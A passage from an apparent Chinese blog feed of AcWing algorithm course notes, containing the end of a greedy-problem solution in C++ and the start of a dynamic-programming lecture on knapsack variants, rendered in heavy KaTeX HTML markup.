mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>&gt;</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">max(s_{i+1}, w_i+s_i) &gt; max(s_i, w_{i+1}+s_{i+1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">5e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">PII cows[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> w, s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;w, &amp;s);</span><br><span class="line">    cows[i] = &#123;w + s, s&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(cows, cows + n);</span><br><span class="line">  <span class="type">int</span> res = <span class="number">-2e9</span>, sum = <span class="number">0</span>;  <span class="comment">// res初始化要足够小: 最大危险系数可能为大负数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> w = cows[i].first - cows[i].second, s = cows[i].second;</span><br><span class="line">    res = <span class="built_in">max</span>(res, sum - s);</span><br><span class="line">    sum += w;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> AcWing算法基础课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5讲 动态规划</title>
      <link href="/2022/11/21/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-5-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2022/11/21/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-5-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h1 id="背包问题">背包问题</h1><table><thead><tr><th style="text-align:left">背包问题</th><th style="text-align:left">每个物品数量</th><th style="text-align:left">状态转移函数</th></tr></thead><tbody><tr><td style="text-align:left">01背包</td><td style="text-align:left">1</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mi>v</mi><mo stretchy="false">)</mo><mo>+</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(i, j) = max(f(i -1, j), f(i -1, j - v) + w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span></td></tr><tr><td style="text-align:left">完全背包</td><td style="text-align:left">无限</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mi>v</mi><mo stretchy="false">)</mo><mo>+</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(i, j) = max(f(i -1, j), f(i, j - v) + w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span></td></tr><tr><td style="text-align:left">多重背包</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">把物品i打包成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">logs_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>个物品, 转化为01背包</td></tr><tr><td style="text-align:left">分组背包</td><td style="text-align:left">每组里只能选1个</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mi>v</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>+</mo><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">f(i, j) = max(f(i - 1, j - v(i, k)) + w(i, k)), k = 0,..,s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">))</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td></tr></tbody></table><p>阎式DP法：</p><ul><li><p>状态表示<code>f[i][j]</code></p><ul><li><p>集合</p><ul><li>只从<strong>前i个物品</strong>中去选，且<strong>总体积不超过j</strong>的<strong>所有选项</strong></li><li>属性 Max, Min, Num</li></ul></li></ul></li><li><p>状态计算</p><ul><li>集合划分</li></ul></li></ul><span id="more"></span><h2 id="AcWing-2-01背包问题"><a href="https://www.acwing.com/problem/content/2/">AcWing 2. 01背包问题 </a></h2><p><code>难度：简单</code></p><p>有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 件物品和一个容量是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 的背包。每件物品只能使用一次。</p><p>第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 件物品的体积是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，价值是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>求解将哪些物品装入背包，可使这些物品的总体积不超过背包容量，且总价值最大。<br>输出最大价值。</p><p><strong>输入格式</strong></p><p>第一行两个整数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mtext>，</mtext><mi>V</mi></mrow><annotation encoding="application/x-tex">N，V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>，用空格隔开，分别表示物品数量和背包容积。</p><p>接下来有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i, w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，用空格隔开，分别表示第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 件物品的体积和价值。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大价值。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo separator="true">,</mo><mi>V</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \lt N, V \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" 